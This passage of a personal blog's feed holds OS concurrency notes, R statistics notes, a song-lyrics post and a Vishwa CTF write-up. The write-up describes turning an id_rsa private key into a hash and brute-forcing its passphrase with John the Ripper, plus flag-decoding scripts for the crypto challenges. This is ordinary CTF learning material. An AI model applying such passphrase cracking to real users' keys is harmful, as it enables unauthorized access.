<span class="title">state</span> <span class="title">from</span>;</span></span><br><span class="line">  <span class="keyword">char</span> ch;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">state</span> <span class="title">to</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rule</span> <span class="title">rules</span>[] =</span> &#123;</span><br><span class="line">  &#123; A, <span class="string">&#x27;&lt;&#x27;</span>, B &#125;,</span><br><span class="line">  &#123; B, <span class="string">&#x27;&gt;&#x27;</span>, C &#125;,</span><br><span class="line">  &#123; C, <span class="string">&#x27;&lt;&#x27;</span>, D &#125;,</span><br><span class="line">  &#123; A, <span class="string">&#x27;&gt;&#x27;</span>, E &#125;,</span><br><span class="line">  &#123; E, <span class="string">&#x27;&lt;&#x27;</span>, F &#125;,</span><br><span class="line">  &#123; F, <span class="string">&#x27;&gt;&#x27;</span>, D &#125;,</span><br><span class="line">  &#123; D, <span class="string">&#x27;_&#x27;</span>, A &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">state</span> <span class="title">current</span> =</span> A;</span><br><span class="line"><span class="keyword">int</span> quota = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pthread_mutex_t</span> lk   = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"><span class="keyword">pthread_cond_t</span>  cond = PTHREAD_COND_INITIALIZER;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">next</span><span class="params">(<span class="keyword">char</span> ch)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LENGTH(rules); i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rule</span> *<span class="title">rule</span> =</span> &amp;rules[i];</span><br><span class="line">    <span class="keyword">if</span> (rule-&gt;from == current &amp;&amp; rule-&gt;ch == ch) &#123;</span><br><span class="line">      <span class="keyword">return</span> rule-&gt;to;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fish_before</span><span class="params">(<span class="keyword">char</span> ch)</span> </span>&#123;</span><br><span class="line">  pthread_mutex_lock(&amp;lk);</span><br><span class="line">  <span class="keyword">while</span> (next(ch) == <span class="number">0</span> || quota == <span class="number">0</span>) &#123;</span><br><span class="line">    pthread_cond_wait(&amp;cond, &amp;lk);</span><br><span class="line">  &#125;</span><br><span class="line">  quota--;</span><br><span class="line">  pthread_mutex_unlock(&amp;lk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fish_after</span><span class="params">(<span class="keyword">char</span> ch)</span> </span>&#123;</span><br><span class="line">  pthread_mutex_lock(&amp;lk);</span><br><span class="line">  quota++;</span><br><span class="line">  current = next(ch);</span><br><span class="line">  assert(current);</span><br><span class="line">  pthread_cond_broadcast(&amp;cond);</span><br><span class="line">  pthread_mutex_unlock(&amp;lk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fish_init</span><span class="params">()</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> roles[] = <span class="string">&quot;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;___&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fish_thread</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> role = roles[id];</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    fish_before(role);</span><br><span class="line">    <span class="built_in">putchar</span>(role); <span class="comment">// should not hold *any* mutex lock now</span></span><br><span class="line">    fish_after(role);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  fish_init();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(roles); i++)</span><br><span class="line">    create(fish_thread);</span><br><span class="line">  join(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>信号量（semaphore）</h1><p>信号量的工作机制，可以直接理解成计数器（当然其实加锁的时候肯定不能这么简单，不只只是信号量了），信号量会有初值（&gt;0），每当有进程申请使用信号量，通过一个P操作来对信号量进行-1操作，当计数器减到0的时候就说明没有资源了，其他进程要想访问就必须等待（具体怎么等还有说法，比如忙等待或者睡眠），当该进程执行完这段工作（我们称之为临界区）之后，就会执行V操作来对信号量进行+1操作。</p><p><strong>临界区</strong>：临界区指的是一个访问共用资源（例如：共用设备或是共用存储器）的程序片段，而这些共用资源又无法同时被多个线程访问的特性。</p><p><strong>临界资源</strong>：只能被一个进程同时使用（不可以多个进程共享），要用到互斥。</p><p>信号量也是进程间通信的一种方式，比如互斥锁的简单实现就是信号量，一个进程使用互斥锁，并通知（通信）其他想要该互斥锁的进程，阻止他们的访问和使用。</p><h3 id="行为建模"><a class="header-anchor" href="#行为建模">¶</a>行为建模</h3><p>Dijkstra提出，故术语PV操作出自荷兰文</p><ul><li>P(&amp;sem) - prolaag = try + decrease; wait; down; in<ul><li>等待一个手环后返回</li><li>如果此时管理员手上有空闲的手环，立即返回</li></ul></li><li>V(&amp;sem) - verhoog = increase; post; up; out<ul><li>变出一个手环，送给管理员</li></ul></li></ul><p>当有进程要求使用共享资源时，需要执行以下操作：</p><p>1.系统首先要检测该资源的信号量；</p><p>2.若该资源的信号量值大于0，则进程可以使用该资源，此时，进程将该资源的信号量值减1；</p><p>3.若该资源的信号量值为0，则进程进入休眠状态，直到信号量值大于0时进程被唤醒，访问该资源；</p><p>当进程不再使用由一个信号量控制的共享资源时，该信号量值增加1（V），如果此时有进程处于休眠状态等待此信号量，则该进程会被唤醒。</p><h1>现代编程语言中的并发模型</h1><h2 id="协程（coroutines）"><a class="header-anchor" href="#协程（coroutines）">¶</a>协程（coroutines）</h2><ul><li>多个可以保存/恢复的执行流</li><li>比线程更轻量 (完全没有系统调用，也就没有操作系统状态)</li></ul><p>在一个没有多线程的程序里面，创建出若干个好像线程的东西。<code>co_start(fn)</code>会在内存中创建一个执行流<code>fn</code>，但是系统当中还是只有一个执行流在执行：先是一直执行<code>main</code>的代码，直至执行<code>co_yield()</code>，暂停当前的执行流，然后切换到另外一个执行流，该执行流从<code>fn</code>开始执行，<code>fn</code>执行完了之后会再次执行<code>co_yield</code>，就会回到之前的执行流去执行。</p><p>协程和线程相比，坏处是无法使用多个CPU，无并行可言。<br>好处是，如果我们希望函数执行的时候帮我们算一个东西出来，并且执行流离开它时函数的状态可以得到保存，下一次执行流再切换回这个函数的时候它可以给我们计算出下一个东西，那么就可以使用协程来完成，Python的Generator就是这样的协程。</p><h2 id="数据中心：协程和线程"><a class="header-anchor" href="#数据中心：协程和线程">¶</a>数据中心：协程和线程</h2><p>数据中心</p><ul><li>同一时间有数千/数万个请求到达服务器</li><li>计算部分<ul><li>需要利用好多处理器<ul><li>线程 → 这就是我擅长的</li><li>协程 → 一人出力，他人摸鱼</li></ul></li></ul></li><li>I/O 部分<ul><li>会在系统调用上 block (例如请求另一个服务或读磁盘)<ul><li>协程 → 一人干等，他人围观</li><li>线程 → 每个线程都占用可观的操作系统资源</li></ul></li></ul></li></ul><h2 id="Go和Goroutine"><a class="header-anchor" href="#Go和Goroutine">¶</a>Go和Goroutine</h2><p>面对协程和线程各自的问题，Goroutine应运而生，使用Go目前也成为了后端开发的趋势，兼顾多处理器并行和轻量级并发。</p><p>Goroutine: 概念上是线程，实际是线程和协程的混合体</p><ul><li><p>在每个CPU上都放一个线程，每个 CPU 上有一个 Go Worker，自由调度 Goroutines。两个CPU上的Goroutine可以是真正并行的。任何时刻单个CPU上只会有一个Goroutine运行。</p></li><li><p>执行到 blocking API 时 (例如 sleep, read)</p><p>Go Worker 偷偷改成 non-blocking 的版本：要执行<code>read</code>的时候，<code>read()</code>都会被替换成<code>tryread()</code></p><ul><li><code>tryread()</code>成功 → 立即继续执行Goroutine</li><li><code>tryread()</code>失败 → 立即 yield 到另一个需要 CPU 的 Goroutine，操作系统会提供相关的api使得它可以在条件合适的时候被唤醒。</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/20220914001607.png" alt></p><p>太巧妙了！CPU 和操作系统全部用到 100%</p><h1>身边的并发：Web 2.0</h1><p>是什么成就了今天的 Web 2.0 ？</p><ul><li>浏览器中的并发编程：Ajax (Asynchronous JavaScript + XML)</li><li>HTML (DOM Tree) + CSS 代表了你能看见的一切<ul><li>通过 JavaScript 可以改变它</li><li>通过 JavaScript 可以建立连接本地和服务器</li></ul></li></ul><h2 id="单线程-事件模型"><a class="header-anchor" href="#单线程-事件模型">¶</a>单线程 + 事件模型</h2><p>我们需要的是尽可能少但又足够的并发。</p><ul><li>一个线程、全局的事件队列、按序执行 (run-to-complete)</li><li>耗时的 API (Timer, Ajax, …) 调用会立即返回（网络请求和结果操作一定不是同一个事件，而是将不同的响应操作加入事件队列）<ul><li>条件满足时向队列里增加一个事件</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$.ajax( &#123; <span class="attr">url</span>: <span class="string">&#x27;https://xxx.yyy.zzz/login&#x27;</span>,</span><br><span class="line">  <span class="attr">success</span>: <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">    $.ajax( &#123; <span class="attr">url</span>: <span class="string">&#x27;https://xxx.yyy.zzz/cart&#x27;</span>,</span><br><span class="line">      <span class="attr">success</span>: <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// do something</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">error</span>: <span class="function"><span class="keyword">function</span>(<span class="params">req, status, err</span>) </span>&#123; ... &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">error</span>: <span class="function"><span class="keyword">function</span>(<span class="params">req, status, err</span>) </span>&#123; ... &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="异步事件模型"><a class="header-anchor" href="#异步事件模型">¶</a>异步事件模型</h2><p>好处</p><ul><li>并发模型简单了很多<ul><li>函数的执行是原子的 (不能并行，减少了并发 bug 的可能性)</li></ul></li><li>API 依然可以并行<ul><li>适合网页这种 “大部分时间花在渲染和网络请求” 的场景<ul><li>JavaScript 代码只负责 “描述” DOM Tree</li></ul></li></ul></li></ul><p>坏处</p><ul><li>Callback hell (祖传屎山)<ul><li>刚才的代码嵌套 5 层，可维护性已经接近于零了</li></ul></li></ul><p>导致 callback hell 的本质：人类脑袋里想的是 “流程图”，看到的是 “回调”。解决：Promise</p><h1>并发bug</h1><h2 id="死锁（Deadlock）"><a class="header-anchor" href="#死锁（Deadlock）">¶</a>死锁（Deadlock）</h2><h3 id="死锁产生的四个必要条件："><a class="header-anchor" href="#死锁产生的四个必要条件：">¶</a>死锁产生的四个必要条件：</h3><ul><li>互斥：一个资源每次只能被一个进程使用</li><li>请求与保持：一个进程请求资阻塞时，不释放已获得的资源</li><li>不剥夺：进程已获得的资源不能强行剥夺</li><li>循环等待：若干进程之间形成头尾相接的循环等待资源关系</li></ul><h3 id="避免死锁"><a class="header-anchor" href="#避免死锁">¶</a>避免死锁</h3><ul><li>任意时刻系统中的锁都是有限的</li><li>严格按照固定的顺序获得所有锁，消除 “循环等待”</li></ul><h2 id="数据竞争（Data-Race）"><a class="header-anchor" href="#数据竞争（Data-Race）">¶</a>数据竞争（Data Race）</h2><p>不同的线程同时访问同一段内存，且至少有一个是写。</p><p>两个内存访问在 “赛跑”，“跑赢” 的操作先执行（如peterson算法）</p><h3 id="解决"><a class="header-anchor" href="#解决">¶</a>解决</h3><p><strong>用互斥锁保护好共享数据，消灭一切数据竞争</strong></p><h3 id="例子"><a class="header-anchor" href="#例子">¶</a>例子</h3><p>数据竞争相关典型的两种bug</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Case #1: 上错了锁（各上个的）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">thread1</span><span class="params">()</span> </span>&#123; spin_lock(&amp;lk1); sum++; spin_unlock(&amp;lk1); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">thread2</span><span class="params">()</span> </span>&#123; spin_lock(&amp;lk2); sum++; spin_unlock(&amp;lk2); &#125;</span><br><span class="line"><span class="comment">// Case #2: 忘记上锁</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">thread1</span><span class="params">()</span> </span>&#123; spin_lock(&amp;lk1); sum++; spin_unlock(&amp;lk1); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">thread2</span><span class="params">()</span> </span>&#123; sum++; &#125;</span><br></pre></td></tr></table></figure><h2 id="动态分析工具：Sanitizers"><a class="header-anchor" href="#动态分析工具：Sanitizers">¶</a>动态分析工具：Sanitizers</h2><ul><li><a href="https://clang.llvm.org/docs/AddressSanitizer.html">AddressSanitizer</a> (asan); <a href="https://www.usenix.org/conference/atc12/technical-sessions/presentation/serebryany">(paper)</a>: 非法内存访问<ul><li>Buffer (heap/stack/global) overflow, use-after-free, use-after-return, double-free, …</li><li>Demo: <a href="http://jyywiki.cn/pages/OS/2022/demos/uaf.c">uaf.c</a>; <a href="https://www.kernel.org/doc/html/latest/dev-tools/kasan.html">kasan</a></li></ul></li><li><a href="https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html">ThreadSanitizer</a> (tsan): 数据竞争<ul><li>Demo: <a href="http://jyywiki.cn/pages/OS/2022/demos/fish.c">fish.c</a>, <a href="http://jyywiki.cn/pages/OS/2022/demos/sum.c">sum.c</a>, <a href="http://jyywiki.cn/pages/OS/2022/demos/peterson-barrier.c">peterson-barrier.c</a>; <a href="https://github.com/google/ktsan">ktsan</a></li></ul></li><li><a href="https://clang.llvm.org/docs/MemorySanitizer.html">MemorySanitizer</a> (msan): 未初始化的读取</li><li><a href="https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html">UBSanitizer</a> (ubsan): undefined behavior<ul><li>Misaligned pointer, signed integer overflow, …</li><li>Kernel 会带着 <code>-fwrapv</code> 编译</li></ul></li></ul><h2 id="防御性编程"><a class="header-anchor" href="#防御性编程">¶</a>防御性编程</h2><p>Canary (金丝雀) 对一氧化碳非常敏感，被用于预警矿井下的瓦斯泄露。计算机系统中也有 canary，“牺牲” 一些内存单元，来预警 memory error 的发生。即在栈的高地址低地址两端都留出缓冲区。</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>R语言笔记</title>
      <link href="/2022/07/23/R%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/07/23/R%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="五数概括"><a class="header-anchor" href="#五数概括">¶</a>五数概括</h2><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">summary(data$A)<span class="comment"># 五数</span></span><br><span class="line"></span><br><span class="line">mean(data$A) <span class="comment"># 均值</span></span><br><span class="line"></span><br><span class="line">median(data$A) <span class="comment">#中位数</span></span><br><span class="line"></span><br><span class="line">var(data$A) <span class="comment"># 方差</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 众数没有标准内置</span></span><br><span class="line">getmode &lt;- <span class="keyword">function</span>(v) &#123;</span><br><span class="line">  uniqv &lt;- unique(v)</span><br><span class="line">  uniqv[which.max(tabulate(match(v, uniqv)))]</span><br><span class="line">&#125;</span><br><span class="line">mode &lt;- getmode(mtcars$drat)</span><br></pre></td></tr></table></figure><h2 id="ggplot绘图"><a class="header-anchor" href="#ggplot绘图">¶</a>ggplot绘图</h2><h3 id="几何对象"><a class="header-anchor" href="#几何对象">¶</a>几何对象</h3><p>geom_bar: 柱状图，饼图</p><p>geom_boxplot: 箱型图</p><p>geom_histogram: 直方图</p><p>geom_freqpoly: 频线图</p><p>geom_density: 密度函数平滑估计图</p><p>geom_point: 散点图</p><p>geom_path/geom_line: 线图(数据出现顺序/横坐标大小)</p><p>geom_smooth: 平滑曲线拟合图</p><p>geom_contour:  等高线</p><h3 id="分面"><a class="header-anchor" href="#分面">¶</a>分面</h3><p>按类别变量的值分组，将绘图窗口划分成若干个子窗口，绘制没一个状态下的图</p><p>facet_wrap(<s>变量)，facet_wrap(变量1</s>变量2)</p><p>facet_wrap(~变量，nrow=行数, ncol=列数)</p><p>基本语法</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ggplot(data, aes(x=variable,y=variable, size/fill/color=variable))</span></span><br><span class="line"><span class="comment"># + geom_bar/histogram/…(color=, size=, fill=, shape=)</span></span><br><span class="line"><span class="comment"># + facet_warp(~变量，ncol=,nrow=) +labs(x=,y=,title=)</span></span><br><span class="line"></span><br><span class="line">ggplot(data = table,aes(x = 身高,y = 体重))+geom_point()</span><br></pre></td></tr></table></figure><h2 id="假设检验"><a class="header-anchor" href="#假设检验">¶</a>假设检验</h2><h3 id="点估计：求解方程"><a class="header-anchor" href="#点估计：求解方程">¶</a>点估计：求解方程</h3><ol><li>install.packages(‘rootSolve’) # 安装rootSolve程序包</li><li>library(rootSolve) # 载⼊包</li><li>用rootSolve包中的函数multiroot()求解方程组；</li></ol><p>例（均匀分布参数的矩估计）：X 服从[θ1, θ2]的均匀分布，现有10个样本：4, 5, 2, 9, 5, 1, 6, 4, 6, 2，估计参数θ1、θ2；</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">install.packages(<span class="string">&#x27;rootSolve’); library(rootSolve);</span></span><br><span class="line"><span class="string">x=c(4, 5, 2, 9, 5, 1, 6, 4, 6, 2);</span></span><br><span class="line"><span class="string">mu=mean(x);</span></span><br><span class="line"><span class="string">var=sum((x-mean(x))^2)/10;</span></span><br><span class="line"><span class="string">model = function(theta, mu, var)&#123;</span></span><br><span class="line"><span class="string">    c(F1 = theta[1] + theta[2] - 2 * mu, F2= (theta[2] - theta[1]) ^ 2 / 12 - var)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">multiroot (f=model, start=c(0,10), mu=mu, var=var)</span></span><br></pre></td></tr></table></figure><h2 id="假设检验-v2"><a class="header-anchor" href="#假设检验-v2">¶</a>假设检验</h2><p>正态总体均值的假设检验：</p><ul><li><p>方差已知：z.test();</p></li><li><p>方差未知：t.test();</p></li><li><p>正态总体方差假设检验：var.test();</p></li></ul><p>➢    例（单个正态总体方差未知）：t.test(x, alternative = “less”, mu=103.5, sigma.x = Null, conf.level=0.95)</p><p>参数解释如下：<br>•    alternative用于指定备择假设的形式，默认为双边假设检验， less表示左边假设检验，greater表示右边假设检验；<br>•    mu表示均值，默认为0；<br>•    sigma.x指定样本标准差；<br>•    conf.level指定的1-𝛼，默认为1-0.05；</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> R </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vishwa CTF记录</title>
      <link href="/2022/04/03/Vishwa%20CTF%E8%AE%B0%E5%BD%95/"/>
      <url>/2022/04/03/Vishwa%20CTF%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1>Vishwa CTF记录</h1><h2 id="Cryptography"><a class="header-anchor" href="#Cryptography">¶</a>Cryptography</h2><h3 id="1-John-The-Rocker"><a class="header-anchor" href="#1-John-The-Rocker">¶</a>1. John The Rocker</h3><p>无题目描述，<a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/idrsa.id_rsa.docx">idrsa.id_rsa</a></p><p>思路：</p><ol><li>先将<code>id_rsa</code>文件转为hash</li><li>根据题目提示使用john the ripper爆破</li></ol><p><img src="https://s2.loli.net/2022/05/03/dpr9NulbKsz8eW5.png" alt="image-20220403014053311"></p><h3 id="2-Tallest-Header"><a class="header-anchor" href="#2-Tallest-Header">¶</a>2. Tallest Header</h3><p>My friend sent me file and said how amazing this is, but i think while sending file corrupted. Can you help me fixing this? PS: make it lowercase<br><a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/file.extension">file.extension</a></p><p>蛮经典的隐写题，用010Editor打开，不难猜到是一张jpg图片，将开头的HEX码改为jpg的格式标识，即可打开。</p><p><img src="https://s2.loli.net/2022/05/03/Ogi8w3XMIVPzREQ.jpg" alt></p><p><code>unzip file.jpg</code>把他分离，果然得到一些文件，得到加密方式以及密文，编写解码脚本也很容易：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># decrypt.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_key</span>(<span class="params">key</span>):</span></span><br><span class="line">    inverse = []</span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">min</span>(key),<span class="built_in">max</span>(key)+<span class="number">1</span>,<span class="number">1</span>):</span><br><span class="line">        inverse.append(key.index(position)+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> inverse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">key, ciphertext</span>):</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(inverse_key(key), ciphertext)</span><br><span class="line"><span class="built_in">print</span>(decrypt(key, ciphertext)</span><br><span class="line"><span class="comment"># 得到flag vishwaCTF&#123;tr1cky_h34d3r_w1th_p3rmu7at10n&#125;</span></span><br></pre></td></tr></table></figure><h3 id="3-Jumble-Bumble"><a class="header-anchor" href="#3-Jumble-Bumble">¶</a>3. Jumble Bumble</h3><p>Jumble Bumble been encode, get the flag from the code<br><a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/JumbleBumble.txt">JumbleBumble.txt</a><br><a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/script.py">script.py</a></p><p>暴力</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> integer_nthroot</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    n = <span class="built_in">int</span>(file.readline().strip())</span><br><span class="line">    c = <span class="built_in">int</span>(file.readline().strip())</span><br><span class="line">    dis = file.readline()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ans = integer_nthroot(c, <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> ans[<span class="number">1</span>]:</span><br><span class="line">            m = ans[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    plaintext = long_to_bytes(m).decode()</span><br><span class="line">    <span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure><h3 id="4-Musical-Notes"><a class="header-anchor" href="#4-Musical-Notes">¶</a>4. Musical Notes</h3><p>Once I opened music website and found this image. There was SEA of images but this one seemed different.<br>There was written under this image that : listentocoolsong<br><a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/image.png">image.png</a><br>Hint: All Chores Encloses Rare Encryption cipher</p><p>![image](image/Vishwa CTF记录/image.png)</p><p>这题实在没有思路，没见过的加密方法，</p><p>解码后：<code>5F6E8ACADC725F3515B9A302FE04FF3DF97D7F08A3BB6ABC4C168E0E14D5044F</code></p><p>题目中SEA暗示AES，secret key 为listentocoolsong……这题实在脑洞，Flag: vishwaCTF{mus1c4l_c1ph3r_1n_4ct10n}</p><h3 id="5"><a class="header-anchor" href="#5">¶</a>5.</h3>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cyber Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>像我这样的人</title>
      <link href="/2022/02/08/%E5%83%8F%E6%88%91%E8%BF%99%E6%A0%B7%E7%9A%84%E4%BA%BA/"/>
      <url>/2022/02/08/%E5%83%8F%E6%88%91%E8%BF%99%E6%A0%B7%E7%9A%84%E4%BA%BA/</url>
      
        <content type="html"><![CDATA[<p>夜晚，终于得以从忙碌的一天脱身。<br>结束了一天的行程，终于将步调放缓了些。<br>一个人的时间，有时并不孤单。<br>一整天的没了自我过后，此刻你才真正拥有自己。<br>偶尔……或是经常，你回朔今日的一举一动，回顾这一周、一个月、一年。一生。<br>你不明所以，为何事情的发展是如此，为何当初的选择是那样，又为何现在的你，是这样。</p><p>《像我这样的人》毛不易，当代音乐不多的我听得入耳的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">像我这样优秀的人</span><br><span class="line">本该灿烂过一生</span><br><span class="line">怎麼二十多年到头来</span><br><span class="line">还在人海裡浮沉</span><br><span class="line"></span><br><span class="line">像我这样聪明的人</span><br><span class="line">早就告别了单纯</span><br><span class="line">怎麼还是用了一段情</span><br><span class="line">去换一身伤痕</span><br><span class="line"></span><br><span class="line">像我这样迷茫的人</span><br><span class="line">像我这样寻找的人</span><br><span class="line">像我这样碌碌无為的人</span><br><span class="line">你还见过多少人</span><br><span class="line"></span><br><span class="line">像我这样庸俗的人</span><br><span class="line">从不喜欢装深沉</span><br><span class="line">怎麼偶尔听到老歌时</span><br><span class="line">忽然也晃了神</span><br><span class="line">像我这样懦弱的人</span><br><span class="line">凡事都要留几分</span><br><span class="line">怎麼曾经也会為了谁</span><br><span class="line">想过奋不顾身</span><br><span class="line"></span><br><span class="line">像我这样迷茫的人</span><br><span class="line">像我这样寻找的人</span><br><span class="line">像我这样碌碌无為的人</span><br><span class="line">你还见过多少人</span><br><span class="line"></span><br><span class="line">像我这样孤单的人</span><br><span class="line">像我这样傻的人</span><br><span class="line">像我这样不甘平凡的人</span><br><span class="line">世界上有多少人</span><br><span class="line"></span><br><span class="line">像我这样迷茫的人</span><br><span 